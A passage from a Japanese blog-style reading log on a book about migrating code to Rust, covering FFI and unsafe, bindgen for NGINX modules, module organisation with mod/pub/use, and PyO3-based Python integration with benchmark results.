}};このコードは一見安全に見える。unsafeブロックは最小限で、エラー処理も適切だ。でも、unsafeの影響は局所的じゃない。もしlineポインタが無効なら、プログラム全体が未定義動作になる。これは「A Philosophy of Software Design」で警告される複雑性の漏れだ。局所的な決定が、システム全体に影響を与える。WebAssemblyという新しい選択肢本章では触れられていないが、WebAssembly（WASM）は興味深い代替案だ。#[wasm_bindgen]pub fn calculate(input: &str) -> Result<i32, JsValue> {    // ...}WASMなら：- メモリ安全性が保証される（サンドボックス環境）- 言語中立的（どの言語からも呼べる）- ポータブル（どこでも動く）でも、パフォーマンスオーバーヘッドがある。wasm-bindgenは素晴らしいツールだが、ネイティブFFIほど高速じゃない。Zigという対抗馬Zig言語は、C互換性を言語の中心に据えている。export fn add(a: i32, b: i32) i32 {    return a + b;}exportキーワードだけで、C互換の関数が作れる。#[no_mangle]やextern \\"C\\"は不要だ。これは設計の単純性の違いだ。RustはC互換性を後付けで追加したが、ZigははじめからC互換性を前提に設計された。どちらが良いかは、プロジェクトの要求次第だ。ziglang.org境界を管理する技術第3章を読み終えて、FFIが単なる技術的な仕組みじゃないことがわかった。それは異なる世界観を持つシステムを接続する哲学だ。Rustのunsafeは、「ここから先は信頼できない世界」という明示的な宣言。この正直さが、システム全体の信頼性を高める。Firecracker VMMが500行のコードでunsafeを一度も使わないのは、FFI境界を慎重に設計した結果だ。「Tidy First?」の精神で言えば、FFIは「整理」と「振る舞いの変更」の境界だ。C側のインターフェースは変えずに（振る舞いを保持）、内部実装をRustに置き換える（整理）。でも、忘れてはいけない。FFIは必要悪だ。理想的には、システム全体を一つの言語で書きたい。でも、現実には既存のコードベースがあり、段階的な移行が必要だ。次の章では、おそらくより高レベルなFFI抽象——PyO3やwasm-bindgenなど——が語られるだろう。unsafeの海から、より安全な抽象の島へ。でも、その島も結局はunsafeの海に浮かんでいることを忘れてはいけない。github.comRPN計算機は動いた。でも、これは始まりに過ぎない。実際のシステムでは、スレッド安全性、例外処理、リソース管理など、さらに多くの課題が待っている。それでも、この章が示したのは希望だ。異なる言語が協調できるという証明。完璧じゃないかもしれない。でも、実用的だ。そして時に、実用性こそが最も重要な美徳なのかもしれない。第4章 Advanced FFI第4章「Advanced FFI」を読んで最初に感じたのは、著者が単純なFFIの技術的詳細よりも複雑な既存システムとの共生戦略に重点を置いているということだった。表面的にはNGINXモジュール開発とbindgenの使い方を説明しているが、その根底にはレガシーシステムとの漸進的統合という時代を超えた課題が埋め込まれている。現実世界の複雑性という試金石第3章のRPN計算機は教育的だった。美しく、理解しやすく、制御可能だった。でも、この章のNGINX統合は戦場だ。NGINXは400万以上のウェブサイトで使われている本物のプロダクションシステム。144個のフィールドを持つngx_http_request_t構造体は、現実世界の複雑性を物語っている。struct ngx_http_request_t {  request_body: *mut ngx_http_request_body_t,  ... // 他に143個のフィールド}この巨大な構造体を前にして、著者は言う。「Don\'t let the large number of NULL values scare you!」。でも、正直なところ、怖いじゃないか。これこそが現実だ。第3章で学んだ「unsafe」の意味——コンパイラが保証できない領域——が、ここでは巨大な海として広がっている。「深いモジュール」の概念では、シンプルなインターフェースの裏に複雑な実装を隠すことが推奨される。でも、NGINXのようなCのコードベースは、その複雑性をすべて露出させている。bindgenが生成した30,000行のRustコードは、その複雑性の氷山の一角に過ぎない。Figure 4.1 High- and low-level Rust bindings for the openssl C library より引用bindgenという魔法の杖、そして現実bindgenは素晴らしいツールだ。C/C++のヘッダファイルを解析して、自動的にRustバインディングを生成してくれる。でも、この章を読んで気づいたのは、bindgenは始まりに過ぎないということだ。let bindings = bindgen::builder()    .header(\\"wrapper.h\\")    .whitelist_type(\\"ngx_.*\\")    .whitelist_function(\\"ngx_.*\\")    .whitelist_var(\\"ngx_.*\\")    .clang_args(vec![        format!(\\"-I{}/src/core\\", nginx_dir),        format!(\\"-I{}/src/event\\", nginx_dir),        // ... 他のインクルードパス    ])    .generate()    .unwrap();最初、bindgenは51,000行のコードを生成した。ngx_プレフィックスでフィルタリングしても30,000行。これは情報の洪水だ。第3章で手動でFFIバインディングを書いた経験から、自動化の恩恵は理解できる。でも、自動化は新たな複雑性も生み出す。「小さな整理から始める」ことの重要性を思い出す。でも、bindgenが生成するコードは、まさにその対極にある。すべてを一度に生成し、後から必要なものだけを選び出す。これは実用的なアプローチだが、同時に認知的負荷の増大でもある。実際、CloudflareがNGINXモジュールcf-htmlをRustで書き直した事例では、bindgenの恩恵を受けながらも多くの困難に直面していた。blog.cloudflare.com 特に印象的なのは、「unsafeブロックを最小化したいが、NGINXとのインターフェースではそれが困難」という記述だ。第3章で学んだunsafeの連鎖が、ここでは巨大なスケールで現れている。ビルドスクリプトという第二のコンパイル第3章では動的ライブラリの生成について学んだが、この章のビルドスクリプトはそれをさらに発展させている。コンパイル時にコードを生成する——これはRustのメタプログラミングの一形態だ。fn main() {    let language = std::env::var(\\"GREET_LANG\\").unwrap();    let greeting = match language.as_ref() {        \\"en\\" => \\"Hello!\\",        \\"es\\" => \\"\xa1Hola!\\",        \\"el\\" => \\"γεια σας\\",        \\"de\\" => \\"Hallo!\\",        x => panic!(\\"Unsupported language code {}\\", x),    };        let rust_code = format!(\\"fn greet() {{ println!(\\\\\\"{}\\\\\\"); }}\\", greeting);    // ... ファイルに書き出し}Figure 4.2 Compilation and execution of a program with a build script より引用この例は単純だが、本質的な問いを投げかけている。コンパイル時と実行時の境界はどこにあるべきか？ 第2章で学んだFirecracker VMMのような産業グレードのプロジェクトでは、この境界の管理が成功の鍵となる。ライフタイム注釈という契約書この章で最も印象的だったのは、ライフタイム注釈の実践的な必要性だ。第2章の美術館の例では概念的だったライフタイムが、ここでは生々しい現実として現れる。unsafe fn request_body_as_str<\'a>(    request: &\'a ngx_http_request_t,) -> Result<&\'a str, &\'static str>この関数シグネチャは、メモリの所有権の系譜を表現している。返される文字列スライスは、NGINXのリクエスト構造体から借用されたものだ。新しいメモリを確保せず、既存のメモリを再解釈する。第3章で学んだ「ゼロコピー」の原則が、ここでは大規模に実践されている。Figure 4.7 Lifetime graph for listing 4.13 より引用「明示的なインターフェース」の重要性がここでも現れる。Rustのライフタイム注釈は、C/C++では暗黙的だった契約を、型システムで明示的に表現する。第1章で語られた「プログラマーとコンパイラの間の契約」が、ここではさらに複雑な形で実現されている。でも、現実のFFIコードでは、この美しい型安全性はunsafeの海に浮かぶ小島に過ぎない。if request.request_body.is_null()    || (*request.request_body).bufs.is_null()    || (*(*request.request_body).bufs).buf.is_null(){    return Err(\\"Request body buffers were not initialized as expected\\");}このnullチェックの連鎖は、C言語の世界の現実だ。第2章で学んだRustのOption型のような優雅さはない。(*(*request.request_body).bufs).bufという表記は、第3章のRPN計算機のシンプルさが懐かしくなる瞬間だ。メモリプールという古の知恵NGINXのメモリプールシステムは、第2章で触れたアリーナアロケータパターンの実装だ。let buf_p = ngx_pcalloc(request.pool,     std::mem::size_of::<ngx_buf_t>() as size_t) as *mut ngx_buf_t;リクエストごとにメモリプールを作り、リクエスト処理が終わったら一括解放する。Rustの所有権システムが登場する前から存在していた、メモリ管理の実践的な解決策だ。でも、NGINXのメモリプールとRustの所有権システムを共存させるのは簡単じゃない。著者も認めているように、「Rustの文字列をNGINXのバッファにコピーする方が、所有権を調整するより簡単」なのだ。std::ptr::copy_nonoverlapping(    response_bytes.as_ptr(),    response_buffer as *mut u8,    response_bytes.len(),);これは実用主義の勝利だ。第1章で語られた「動いているシステムを止めずに改善する」原則の具現化。理想的ではないが、動作する。現実のプロジェクトから学ぶこの章のNGINXモジュールは、127行のRustコードで実装されている。第3章のRPN計算機と比べると、コード量は増えたが、複雑性は指数関数的に増加している。F5のngx-rustプロジェクトは、より高レベルな抽象化を提供している。www.f5.comこれは第3章で触れたPyO3のような高レベルバインディングの方向性だ。生のFFIを人間工学的なAPIでラップしている。#[nginx::main]async fn handler(req: &Request) -> Result<Response, Error> {    // 高レベルAPI}一方、Cloudflareは異なるアプローチを取った。NGINXを使わず、Pingoraという独自のプロキシをRustで書き直した。blog.cloudflare.com これは第1章で警告された「big bang-style rewrites」の成功例だ。1兆リクエスト/日を処理し、NGINXと比較して70%少ないCPUと67%少ないメモリで動作する。パスの分岐点：統合か、置き換えかこの章を読んで、第1章で提示された段階的移行の哲学が、ここで二つの道に分かれることを認識した。統合アプローチNGINXモジュールのように、既存システムに寄生する。第3章で学んだFFIの基礎が、ここでは大規模に適用される。利点は明確です。既存のエコシステムを活用できる段階的な移行が可能（第1章の理想）リスクが限定的でも、代償もある。FFIの複雑性（本章全体がその証明）パフォーマンスのオーバーヘッド二つの世界の間での認知的負荷置き換えアプローチPingoraのように、ゼロから書き直す。これは：クリーンなアーキテクチャ最適なパフォーマンス統一された開発体験でも、Joel Spolskyが警告したように、完全な書き直しは最も危険な選択でもある。www.joelonsoftware.comNetscapeの失敗は今でも教訓として語り継がれている。bindgenを超えて、新しいFFI第3章ではFFIの基礎を学んだが、この章では自動化の限界も見えてきた。そして、FFIの世界は進化し続けている。rust-vmmプロジェクトは、Firecrackerと他のVMMプロジェクトが共通コンポーネントを共有するために生まれた。github.com これは第2章で分析したFirecracker VMMの成功を、より広いエコシステムに展開する試みだ。最初から共有を前提に設計することで、FFIの必要性を減らしている。Diplomatは、一つのRust APIから複数の言語向けのバインディングを生成する。github.com これはbindgenの逆方向——RustからCへ——を一般化したものだ。UniFFI（Mozilla）は、インターフェース定義言語を使って、より高レベルな抽象化を提供する。github.com Firefox 105以降、JavaScriptバインディングの生成もサポートし、第1章で語られた「異なる世界をつなぐ橋」がさらに広がっている。wasm-bindgenは、WebAssemblyを介した新しいFFIの形を示している。github.com 第3章で触れたWASMの可能性が、ここでは実用的なツールとして結実している。橋を架ける技術第4章を読み終えて、Advanced FFIが単なる技術的な手法じゃないことがわかった。それは異なる世界観を持つシステムを接続する架け橋だ。第1章で学んだ「振る舞いを保ちながら、実装を改善する」という原則が、ここでは最も困難な形で試されている。NGINXの外部インターフェースは変えずに、内部でRustの計算機を呼び出す。第3章の教育的な例が、ここでは産業的な実装として昇華されている。でも、現実は理想よりも複雑だ。30,000行の自動生成コード、nullチェックの連鎖、メモリコピーの必要性。これらは技術的負債じゃない。異なるパラダイムを共存させるための必要なコストだ。ISRGとCloudflareが協力して開発しているRiverプロジェクトは、Pingoraの上に構築される新しいリバースプロキシで、NGINXの直接的な代替を目指している。www.memorysafety.orgこれは統合から置き換えへの移行を示唆している。「複雑性は排除できない、管理するしかない」という言葉を思い出す。この章は、まさにその実践例だ。bindgenは複雑性を自動化し、ビルドスクリプトは複雑性を整理し、ライフタイム注釈は複雑性を型システムで表現する。最後に、この章が示しているのは実用主義の重要性だ。第3章の美しいRPN計算機から、この章の泥臭いNGINXモジュールへ。理想的なFFIは存在しない。でも、動作するFFIは作れる。そして時に、それで十分なのだ。NGINXモジュールは動いた。127行のRustコードが、400万のウェブサイトを支えるシステムと対話している。これは小さな一歩かもしれない。でも、確実な一歩だ。第1章で語られた段階的改善の哲学が、ここで実を結んでいる。次の章へ進む前に、この章が教えてくれた最も重要なことを心に刻んでおきたい。完璧を求めて立ち止まるより、不完全でも前進することの価値を。第3章の小さな橋から、第4章のより大きな橋へ。そして、いつかその橋が大きな道になるかもしれない。その可能性を信じて、一歩ずつ前進していくことが大切なのだ。第5章 Structuring Rust libraries第5章「Structuring Rust libraries」を読んで最初に感じたのは、著者がモジュールという技術的な仕組みよりもコードの組織化がもたらす認知的な明瞭性に重点を置いているということだった。表面的にはmod、use、pubの使い方を説明しているが、その根底には複雑性を管理可能な単位に分割するという時代を超えた課題が埋め込まれている。美術館から挨拶プログラムへ——そして最初の躓き第2章では美術館のアートワーク管理という概念的な例で所有権を学んだ。あの美しい抽象化。第3章ではRPN計算機という教育的な例でFFIの基礎を築き、第4章では127行のコードでNGINXという巨大システムと対話した。30,000行の自動生成コードという現実の複雑性。そして今、第5章では「greeter」という挨拶プログラムを通じて、同じRust内での境界管理を学ぶ。mod input {  pub fn get_name() -> String { ... }}mod output {  pub fn hello(name: &str) { ... }  pub fn goodbye(&name: &str) { ... }}正直に言うと、最初はこの章を軽く見ていた。「ただのモジュール分割でしょ？」と。でも、実際にコードを書いてみると、コンパイラに怒られまくった。error[E0425]: cannot find function `get_name` in this scopeerror[E0603]: function `get_name` is privateこのエラーの連続は、まるで厳格な教師に叱られているような気分だった。Pythonならimport一行で済むのに、なぜRustはこんなに面倒なのか。modで宣言して、pubで公開して、useでインポートして——最初は「過剰設計じゃないか？」と苛立った。でも、DayKindというenumが登場したとき、著者の意図が見えてきた。「これはどこに属するのか？」入力でも出力でもない。これは共有される概念だ。Figure 5.1 Graph of greeting program より引用この図を見て気づいた。Rustは私に設計を強制しているのだと。どのモジュールがどのモジュールに依存するか、明示的に宣言しなければならない。これは制約だが、同時に思考の整理でもある。Kent BeckのCLAUDE.mdとの出会い最近偶然発見したKent BeckのBPlusTree3プロジェクト。そのCLAUDE.mdファイルを読んで、背筋が伸びる思いがした。github.com「構造的変更と振る舞いの変更を決して混ぜない」——この一文が、第5章全体を貫く哲学だと気づいた瞬間、パズルのピースがはまるような感覚があった。// 構造的変更：モジュールの再編成mod day_kind;  // 共有概念を独立モジュールへuse crate::day_kind::DayKind;// 振る舞いの変更：新機能の追加fn greet_with_time(name: &str, day: DayKind) {    // 新しい振る舞い}Kent Beckは52年のプログラミング経験を経て、AIエージェントを使ったコーディングに新たな活力を見出している。彼が「TDDがAIエージェントと働く際のスーパーパワーになる」と語るのを読んで、モジュール構造の重要性を再認識した。newsletter.pragmaticengineer.comAIも人間も、明確な構造があれば「どこに何を追加すべきか」がわかる。第3章で学んだunsafeの境界が「信頼の切れ目」だったように、モジュールの境界は「責任の切れ目」なのだ。erenaやlsmcpといったMCPサーバーを使うと、この「責任の切れ目」を生成AIとより効果的に共有できる。 serenaは、Language Server Protocol（LSP）を活用して、シンボルレベルでの理解と編集を可能にする。 大規模で複雑なプロジェクトでも、IDEの機能を使うベテラン開発者のように、具体的な状況に応じたコンテキストを発見し、正確な編集を行える。github.com一方、lsmcpは「ヘッドレスAIエージェント向けのLSP」として設計されている。 LLMは正確な文字位置の追跡が苦手なため、lsmcpは行番号とシンボル名を通じてLSP機能を提供する。 Go to Definition、Rename Symbol、Find Referencesといったセマンティックなリファクタリング機能を、AIが使いやすい形で提供する。 github.comこれらのツールの重要な点は、TypeScript/JavaScriptだけでなく、Rust、Python、Go、C/C++など、LSPサーバーがある言語なら何でも対応できる拡張性を持つことだ。 Kent Beckが示したような明確なモジュール構造があれば、これらのツールはより的確に「今どの部分を修正すべきか」を判断できる。つまり、良いモジュール設計は人間の理解を助けるだけでなく、AIツールとの協働においても強力な基盤となる。構造と振る舞いを分離する規律は、人間とAIが共に働く時代の新しいベストプラクティスなのかもしれない。Rustモジュールシステムの特異性——最初は憎たらしく、後に愛おしく多くの言語では、ファイルシステムが暗黙的にモジュール構造を定義する。JavaScriptやPythonでは、ディレクトリ構造がそのままモジュール階層になる。でも、Rustは違う。明示的なmod宣言が必要だ。confidence.sh最初、この仕様にイライラした。なぜファイルを作っただけでモジュールにならないのか？なぜmod bananas;と書かないとbananas.rsを認識してくれないのか？mod input;   // 明示的にinput.rsを読み込むmod output;  // 明示的にoutput.rsを読み込むでも、数日間格闘した後、この明示性の価値に気づいた。すべてが意図的なのだ。偶然モジュールに含まれるファイルはない。すべては意識的な選択の結果だ。第3章でextern \\"C\\"を明示的に宣言したように、第4章でbindgenのホワイトリストを明示的に指定したように、ここでもモジュールの包含を明示的に宣言する。この一貫性が、今では美しく感じる。パスという迷宮——そして、その中で迷子になった話Rustのパスシステムは、初学者にとって最も混乱しやすい部分の一つだ。相対パスと絶対パス、crate、super、self——これらのキーワードが織りなす複雑な体系。use crate::day_kind::DayKind;  // 絶対パスuse super::Treat;              // 相対パス（親モジュール）use self::shop::buy;           // 相対パス（現在のモジュール）Figure 5.2 Relative and absolute paths used in listing 5.15 より引用実際にoutput.rsでuse day_kind::DayKind;と書いて、あのエラーに遭遇した時の絶望感を今でも覚えている。error[E0432]: unresolved import `day_kind` --\x3e src/output.rs:1:5  |1 | use day_kind::DayKind;  |     ^^^^^^^^ help: a similar path exists: `crate::day_kind`「なんで見つからないの？同じプロジェクトにあるじゃん！」と画面に向かって叫びたくなった。コンパイラのヘルプメッセージが「crate::day_kindを使え」と教えてくれたが、最初は「なんでcrateって書かなきゃいけないの？」と反発した。でも、これは第4章でNGINXの複雑な構造体フィールドにアクセスするために(*(*request.request_body).bufs).bufという呪文のような表記を使ったことを思い出させた。それと比べれば、crate::プレフィックスなんて優しいものだ。少なくとも、nullチェックの連鎖は必要ない。read_lineヘルパー関数の誕生greeterプログラムを書いていて、名前の後に改行が入る問題に気づいた時、最初は「また面倒な問題が...」と思った。でも、read_lineヘルパー関数を作る過程で、小さな発見があった。fn read_line() -> String {  let mut line = String::new();  stdin().read_line(&mut line).unwrap();  line.trim()  // これはコンパイルエラー！}trim()が&strを返すことを知った時の「あぁ、そうか！」という納得感。Rustは新しいメモリを確保せず、既存のメモリへの参照を返す。効率的だが、今回はStringが必要。.to_string()を追加することで解決した。この小さな躓きと解決の積み重ねが、Rustのゼロコスト抽象化の哲学を体感させてくれた。必要な時だけメモリを確保する。無駄がない。美しい。Rust 2024 Editionとモジュールシステムの進化——未来への期待第4章でbindgenが51,000行から30,000行のコードを生成した話を思い出してほしい。あの情報の洪水。Rust 2024 editionは、そんな複雑性をより安全に管理するための進化を遂げている。doc.rust-lang.orgunsafeの境界がさらに明確にRust 2024ではunsafe_op_in_unsafe_fnリントがデフォルトで有効になる。実際に試してみた：// Rust 2021（今までの世界）unsafe fn process(ptr: *const u8) {    *ptr;  // 暗黙的にunsafe}// Rust 2024（新しい世界）unsafe fn process(ptr: *const u8) {    unsafe { *ptr };  // 明示的にunsafe}この変更を知った時、「さらに面倒になるのか...」と最初は思った。でも、第4章のNGINXモジュールで苦労したnullチェックの連鎖を思い出すと、この改善の価値がわかる。危険な操作を可能な限り局所化する——これは小さな整理の極致だ。可視性という境界管理——pub(crate)の発見pubキーワードは単なる公開・非公開の切り替えじゃない。これはAPIの境界を定義する宣言だ。mod forest {  pub(crate) fn enter_area(area: &str) {    // クレート内では見えるが、外部からは見えない  }}Figure 5.3 Visualization of the parent visibility rule: modules can use private items from parent modules. より引用pub(crate)を初めて見た時、「なんて中途半端な...」と思った。公開なの？非公開なの？でも、使ってみると、これが絶妙なバランスだとわかった。第3章のunsafeが「ここから先は信頼できない」という宣言だったのに対し、pub(crate)は「ここまでは信頼できる仲間」という宣言。forestクレートの例で、この段階的な信頼の輪の美しさに気づいた。そして、上向き可視性のルールには驚いた。子モジュールが親の非公開アイテムにアクセスできる——これは親が子を無条件に信頼するという、現実世界の関係性をコードに投影している。最初は「変なルールだな」と思ったが、実際に使ってみると自然で直感的だった。実践的なモジュール設計——失敗と学び実際のRustプロジェクトを見ると、モジュール設計の多様性に気づく。serdeのような洗練されたクレートを見て、憧れと同時に劣等感も感じた：serde::ser     // シリアライズserde::de      // デシリアライズ  serde::error   // エラー型シンプルで美しい。第2章で学んだ「深いモジュール」の理想的な実装だ。一方で、著者が示した過度にネストされた例を見て、苦笑いした：pub mod the {  pub mod secret {    pub mod entrance {      pub mod to {        pub mod the {          pub mod forest {            pub fn enter() { }          }        }      }    }  }}実は、最初のプロジェクトで似たような過剰な構造を作ってしまった経験がある。「きちんと整理しなきゃ」という強迫観念に駆られて。でも、pub useによる再エクスポートを知って救われた：pub use the::secret::entrance::to::the::forest::enter;これはAPIの簡潔性と実装の構造化のバランスを取る素晴らしい手法だ。第3章で学んだ「薄い抽象化層」の概念が、ここでも生きている。forestクレートで感じた設計の妙著者が最後に示したforestクレートの例は、最初は「なんでこんな例を？」と思った。でも、実装してみて、その巧妙さに感心した。pub mod tree_cover {  pub fn enter() {    crate::forest::enter_area(\\"tree cover\\");  }}各エリアが共通の実装を使いながら、独自のインターフェースを提供する。これを書いていて、「あ、これってファクトリーパターンみたい」と気づいた瞬間があった。そして、enter_areaを最初pubにして、後からpub(crate)に変更する過程で、APIの進化を体験できた。最初は全部公開、でも「これは内部実装だから隠したい」という自然な欲求。これは実際のプロジェクトでも起こることだ。AIエージェント時代のモジュール設計Kent Beckが指摘するように、従来のプログラミングスキルの90%が商品化される一方で、残りの10%が1000倍の価値を持つようになる。モジュール設計は、その10%に属すると私も信じている。natesnewsletter.substack.com実際、Claude Codeにgreeterプログラムを説明してもらった時、モジュール構造が明確だったおかげで、AIも的確に理解してくれた。逆に、過度にネストされた構造を見せた時は、AIも混乱していた（人間と同じだ！）。// AIが理解しやすい明確な構造pub mod authentication {    pub mod login { ... }    pub mod logout { ... }    mod session_management { ... }  // 内部実装}この経験から、モジュール設計は人間とAIの共通言語になりうると感じた。大規模プロジェクトでの現実——400クレートの戦いある開発者が400クレート、1500以上の依存関係を持つワークスペースでRust 2024への移行を実践した記事を読んで、頭が下がった。codeandbitters.com彼らのアプローチ：コード生成を行うクレートを最初に更新rust-2024-compatibilityリントを一つずつ有効化必要に応じて変更を加えながら段階的に移行これを読んで、第1章で警告された「big bang-style rewrites」を避ける原則の重要性を改めて実感した。私の小さなプロジェクトでさえモジュール構造の変更は大変だったのに、400クレートなんて想像を絶する。整理という名の哲学第5章は、技術的には最もシンプルな章かもしれない。第3章のunsafeもない、第4章のbindgenもない、ただモジュールを作って整理するだけ。最初は「楽勝だろう」と思っていた。でも、実際に手を動かしてみて、これが最も哲学的に深い章だと気づいた。コンパイラに怒られながら、エラーメッセージと格闘しながら、少しずつRustのモジュールシステムの意図が見えてきた。それは単なる整理じゃない。思考の整理であり、責任の明確化であり、信頼の境界の定義だ。greeterプログラムは完成した。たった数十行の小さなプログラム。でも、この小さなプログラムを通じて、大規模システムの設計原則を学んだ。DayKindをどこに置くかで悩んだ時間、crate::プレフィックスの意味を理解した瞬間、pub(crate)の絶妙さに気づいた時——これらすべてが、私のRust理解を深めてくれた。モジュールシステムの学習曲線は確かに急だ。Pythonのimportに慣れた身としては、最初は「過剰じゃない？」と思った。でも今では、この厳格さが長期的な保守性を保証することがわかる。Kent BeckのCLAUDE.mdが教えてくれた「構造と振る舞いを分離する」という原則。これはモジュール設計の核心だ。そして、小さな整理の積み重ねが、大きな改善につながる。この章を読み終えて、書き終えて、Rustが少し好きになった。面倒くさいけど、その面倒くささには理由がある。厳しいけど成長を考えてくれる先輩みたいだ。厳格だけど、その厳格さが安全を保証する。第6章 Integrating with dynamic languages第6章「Integrating with dynamic languages」を読んで最初に感じたのは、著者が単なるPython統合の技術的手法よりも異なるパラダイムの言語が協調する哲学に重点を置いているということだった。表面的にはPyO3とSerdeを使った実装方法を説明しているが、その根底には理想的な性能と現実的な開発速度のトレードオフという時代を超えた課題が埋め込まれている。JSONの10行から始まる旅第5章のgreeterプログラムでモジュールの哲学を学んだ後、今度は10行のJSONデータから始まる、より現実的な統合の旅が始まる。for line in sys.stdin:  value = json.loads(line)  s += value[\'value\']  s += len(value[\'name\'])正直、最初にこのコードを見た時、「え、これだけ？」と思った。NGINXモジュールの複雑さを経験した後だけに、このシンプルさは拍子抜けだった。でも、著者の次の言葉にハッとした。「People have very high expectations for the performance of this feature」——期待値の管理という、技術以前の問題がここにある。Serdeという魔法Serdeとの初めての出会いは魔法のようだった。#[derive(Debug, serde::Deserialize)]struct Data {  name: String,  value: i32,}たった一行の#[derive(serde::Deserialize)]で、JSON解析が動く。この簡潔さは衝撃的だった。Figure 6.1 The Serde ecosystem より引用でも、実際に使ってみると、いくつか躓いた。最初、deriveフィーチャーを有効にし忘れて、コンパイラに怒られた：the trait `serde::de::Deserialize<\'_>` is not implemented for `Data`Cargo.tomlにfeatures = [\\"derive\\"]を追加する必要があることを知った時、「なんで最初から有効じゃないの？」と思った。でも、これも明示性の原則の表れだと気づいた。必要なものだけを明示的に選ぶ。serde.rsPyO3の洗練された抽象化PyO3の導入部分は、FFI知識の集大成だった。#[pymodule]fn rust_json(_py: Python, m: &PyModule) -> PyResult<()> {  m.add_function(wrap_pyfunction!(sum, m)?)?;  Ok(())}#[pymodule]や#[pyfunction]のマクロは、手動FFIコードを多くの場合隠蔽している。わずか数行のマクロで済む。これは抽象化の力だ。でも、最初のimport rust_jsonで見事に失敗した：ModuleNotFoundError: No module named \'rust_json\'maturinの存在を知り、仮想環境を作り、maturin developを実行して、やっと動いた時の喜び。開発環境のセットアップにも段階的改善が必要だった。github.comベンチマークの衝撃Criterionを使ったベンチマークは、「測定できないものは改善できない」という原則の実践だった。Figure 6.2 Anatomy of our benchmark program より引用測りすぎ――なぜパフォーマンス評価は失敗するのか？作者:ジェリー・Z・ミュラーみすず書房Amazon最初のベンチマーク結果を見た時の衝撃を今でも覚えている：pure python             time:   [25.415 us 25.623 us 25.842 us]rust extension library  time:   [21.746 us 21.987 us 22.314 us]たった10%の改善？ unsafe地獄を通り、bindgenの海を泳ぎ、モジュールの迷宮を彷徨って、結果がこれ？正直、がっかりした。でも、著者の次の一言が全てを変えた。「We are forgetting one important thing that Rust has that Python does not: an optimizing compiler」--releaseの威力maturin develop --releaseを実行して、再度ベンチマークを取った時の結果：pure python             time:   [25.019 us 25.188 us 25.377 us]rust extension library  time:   [10.843 us 10.918 us 10.996 us]2倍以上の高速化！ この瞬間、今まで見てきたFinished dev [unoptimized + debuginfo]というメッセージの意味を理解した。ずっとデバッグビルドで測定していたのだ。この経験から学んだ重要な教訓：最適化なしのRustは、最適化されたPythonより遅いことがある。これは多くの人が陥る罠だと、後で知った。stackoverflow.comFFIオーバーヘッドという現実PyO3のGitHubイシューを読んで、さらに深い理解を得た。小さな関数では、FFIのオーバーヘッドがRustの性能向上を打ち消してしまうことがある。github.com実際、空の関数を呼ぶだけでも：純粋なPython: 43nsPyO3経由: 67.8nsこの差は、GIL（Global Interpreter Lock）の取得、引数の変換、エラーハンドリングのセットアップなど、FFIの必要悪から生まれる。実践的な教訓この章を読んで、そして実際に試してみて、いくつかの重要な教訓を得た：ループ全体を移行するPythonでループを回して、各イテレーションでRust関数を呼ぶのは最悪のパターン。FFIオーバーヘッドが積み重なる。# 悪い例for item in items:    result = rust_function(item)  # FFIオーバーヘッドが毎回発生# 良い例results = rust_batch_process(items)  # FFIオーバーヘッドは1回だけblog.erikhorton.comデータ変換のコストを意識するPyO3は便利な型変換を提供するが、それにはコストがある。特に大きなデータ構造を頻繁に変換する場合は要注意。計算密度の高い処理を選ぶJSONの解析程度では、Pythonのjsonモジュール（C実装）も十分速い。画像処理、暗号計算、シミュレーションなど、本当に計算が重い部分を選ぶべき。maturinの開発体験maturinの開発体験は素晴らしかった。maturin develop一発で、Rustコードの変更がPython環境に反映される。手動FFIやbindgenと比べると、天と地の差だ。実際、個人プロジェクトでも試してみた。100万件のCSVデータを処理するスクリプトがあったんだが、PandasからRustに移行してみた：Pandas版: 3.2秒Rust版（デバッグ）: 4.1秒（遅い！）Rust版（リリース）: 0.8秒（4倍速い！）--releaseの重要性を、身をもって体験した瞬間だった。ketansingh.mePython::with_gilという逆方向の統合ベンチマークのコードで出てきたPython::with_gilは、新しい発見だった。Python::with_gil(|py| {  let locals = PyDict::new(py);  // PythonコードをRustから実行  py.run(code, None, Some(&locals)).unwrap()});Figure 6.5 bench_fn diagram より引用これは逆方向のFFI。RustからPythonを呼ぶ。双方向の統合が可能だという発見は、新しい可能性を開いてくれた。他言語との統合章の最後で触れられた他言語との統合：Rutie: Ruby統合Neon: Node.js統合j4rs/JNI: Java統合flutter_rust_bridge: Flutter統合「段階的改善」の哲学が、あらゆる言語で実践可能だということ。Rustは言語中立的な改善ツールとして機能する。失敗の価値この章で最も価値があったのは、失敗の共有だ。最適化なしで10%しか改善しなかった結果。これは多くの人が経験する失望だろう。失敗の科学作者:マシュー・サイドディスカヴァー・トゥエンティワンAmazon実際、PyO3のディスカッションを見ると、似たような体験談が溢れている：github.com「純粋なRustでは60nsなのに、Pythonから呼ぶと22,350nsになった」という報告。370倍の遅延。これがFFIの現実だ。でも、だからこそ、具体的な状況に応じた場所に具体的な状況に応じた技術を使うことの重要性がわかる。必要な場所だけを改善する——それが実用的なアプローチだ。Polarsとの出会いこの章を読んだ後、Polarsという高速データフレームライブラリを知った。PandasのRust実装で、PyO3を使っている。medium.com試してみた結果：Pandas: 1000万行の集計で12秒Polars: 同じ処理で0.3秒（40倍速い！）これが適切に設計されたRust統合の威力だ。ループ全体をRustに移し、データ変換を最小化し、並列処理を活用している。低い解像度で掲げた時の理想の全ては叶わない。第6章を読み終えて、そして実際に手を動かしてみて、RustとPythonの統合が銀の弾丸じゃないことがよくわかった。小さな関数では逆に遅くなることもある。最適化を忘れれば性能は出ない。FFIのオーバーヘッドは無視できない。これらはすべて現実だ。でも、同時に可能性も見えた。適切に設計され、適切に最適化されたRust統合は、劇的な性能向上をもたらす。Polarsのような成功例がそれを証明している。測定し（Criterion）、分析し（FFIオーバーヘッド）、改善し（--release）、検証する（ベンチマーク）。このサイクルこそが、段階的改善の本質だ。最後に、正直な感想を一つ。この章を読んで、実装して、ベンチマークして、Rustが本当に実用的な選択肢だと確信した。完璧じゃない。でも、確実に価値がある。第7章 Testing your Rust integrations第7章「Testing your Rust integrations」を読んで最初に感じたのは、著者が単なるテスト技法の説明よりも既存コードとの信頼関係を構築する哲学に重点を置いているということだった。表面的には#[test]やassert_eq!の使い方を説明しているが、その根底には段階的移行における安全網の構築という時代を超えた課題が埋め込まれている。2 + 2 = 4から始まる旅第6章でPyO3を使ってRustとPythonを統合し、10%から2倍以上の性能改善を達成した。でも、速いコードが正しいコードとは限らない。そして今、著者は最もシンプルなテストから始める。#[test]fn it_works() {    let result = 2 + 2;    assert_eq!(result, 4);}正直、最初は「なんて退屈な例だ」と思った。でも、このシンプルさには意味がある。Kent Beckの「Test-Driven 